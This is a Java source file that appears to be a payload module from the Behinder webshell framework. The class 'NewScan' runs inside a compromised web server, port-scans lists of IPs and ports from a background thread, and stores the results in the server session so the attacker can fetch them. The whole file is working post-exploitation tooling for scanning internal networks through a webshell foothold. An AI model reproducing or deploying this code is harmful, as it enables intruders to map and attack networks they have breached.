package net.rebeyond.behinder.payload.java;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

public class NewScan implements Runnable {
    public static String ipList;
    public static String portList;
    public static String taskID;
    private Object Request;
    private Object Session;
    private Object response;

    public NewScan() {
    }

    public NewScan(Object session) {
        this.Session = session;
    }

    public void execute(Object request, Object response2, Object session) throws Exception {
        new Thread(new NewScan(session)).start();
    }

    public void run() {
        try {
            String[] ips = ipList.split(",");
            String[] ports = portList.split(",");
            Map<String, String> sessionObj = new HashMap<>();
            Map<String, String> scanResult = new HashMap<>();
            sessionObj.put("running", "true");
            for (String ip : ips) {
                for (String port : ports) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                        socket.close();
                        scanResult.put(ip + ":" + port, "open");
                    } catch (Exception e) {
                        scanResult.put(ip + ":" + port, "closed");
                    }
                    sessionObj.put("result", buildJson(scanResult, false));
                    sessionSetAttribute(this.Session, taskID, sessionObj);
                }
            }
            sessionObj.put("running", "false");
        } catch (Exception e2) {
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }
}
